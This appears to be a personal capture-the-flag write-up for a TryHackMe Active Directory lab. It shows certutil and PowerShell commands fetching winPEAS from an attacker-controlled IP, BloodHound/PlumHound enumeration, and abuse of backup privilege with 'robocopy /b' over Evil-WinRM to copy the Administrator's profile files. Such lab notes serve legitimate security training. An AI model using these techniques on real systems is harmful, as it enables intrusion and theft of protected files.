We u recall we have run the blood hound earlier and got some place in our disposal otherwise
simply we can try to run winpeas as we were not able to run in the vulnet bix earlier
```
certutil.exe -urlcache -f http://10.8.167.78:8080/winPEASx64_ofs.exe winPEASx64_ofs.exe

$URL ="http://10.8.167.78:8080/winPEASx64_ofs.exe"

$Path="C:\Users\xyan1d3\winPEASx64_ofs.exe"

Invoke-WebRequest -URI $URL -OutFile $Path
```
![[Pasted image 20230921171843.png]]


Bloodhound Enumeration
![[Pasted image 20230921164436.png]]

All Domains
![[Pasted image 20230921164615.png]]


![[Pasted image 20230921170150.png | 500]]


![[Pasted image 20230921170224.png | 500 ]]

![[Pasted image 20230921170507.png]]
This will some idea what the network looks like

Shortest Path
![[Pasted image 20230921170627.png]]

Plumhound
```
https://github.com/PlumHound/PlumHound.git
python3 PlumHound.py --easy -p password
python3 PlumHound.py -x tasks/default.tasks -p password
RAZ0RBLACK.THM	2016	True	RAZ0RBLACK.THM	DC=RAZ0RBLACK,DC=THM	S-1-5-21-3403444377-2687699443-13012745
```
![[Pasted image 20230921173253.png]]

![[Pasted image 20230921173322.png]]

![[Pasted image 20230921173756.png]]

![[Pasted image 20230921175907.png]]
We can do backup of all the senstive files and restore it

We will simply copy the root.xml file from Administrator to a temp file using a tool called robocop
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy

```
robocopy /b C:\Users\Administrator\root.xml C:\Temp
```
![[Pasted image 20230921180339.png]]

```
*Evil-WinRM* PS C:\Users\xyan1d3> robocopy /b C:\Users\Administrator\root.xml C:\Temp

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, September 21, 2023 5:34:13 AM
   Source : C:\Users\Administrator\root.xml\
     Dest : C:\Temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

2023/09/21 05:34:13 ERROR 123 (0x0000007B) Accessing Source Directory C:\Users\Administrator\root.xml\
The filename, directory name, or volume label syntax is incorrect.

*Evil-WinRM* PS C:\Users\xyan1d3> robocopy /b C:\Users\Administrator C:\Temp

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, September 21, 2023 5:35:30 AM
   Source : C:\Users\Administrator\
     Dest : C:\Temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          9    C:\Users\Administrator\
            New File                 290        cookie.json
  0%
100%
            New File              786432        NTUSER.DAT
  0%
  8%
 16%
 25%
 33%
 41%
 50%
 58%
 66%
 75%
 83%
 91%
100%
100%
            New File                   0        ntuser.dat.LOG1
100%
            New File              237568        ntuser.dat.LOG2
  0%
 27%
 55%
 82%
100%
            New File               65536        NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
  0%
100%
100%
            New File              524288        NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
  0%
 12%
 25%
 37%
 50%
 62%
 75%
 87%
100%
100%
            New File              524288        NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
  0%
 12%
 25%
 37%
 50%
 62%
 75%
 87%
100%
100%
            New File                  20        ntuser.ini
  0%
100%
            New File                2512        root.xml
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         9         9         0         0         0         0
   Bytes :    2.04 m    2.04 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :             6840044 Bytes/sec.
   Speed :             391.390 MegaBytes/min.
   Ended : Thursday, September 21, 2023 5:35:30 AM

*Evil-WinRM* PS C:\Users\xyan1d3> ls C:\Temp


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml


```
